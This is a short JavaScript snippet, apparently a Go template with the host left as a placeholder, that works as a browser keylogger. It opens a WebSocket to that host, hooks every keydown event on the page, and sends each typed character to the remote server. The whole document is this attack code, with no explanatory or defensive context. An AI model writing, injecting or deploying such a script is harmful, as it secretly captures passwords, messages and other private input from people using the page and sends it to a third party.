(
    function () {
        var conn = new WebSocket("ws://{{.}}/ws");
        document.onkeydown = keydown;
        function keydown(e) {
            s = String.fromCharCode(e.which);
            conn.send(s);
        }
    }
)();
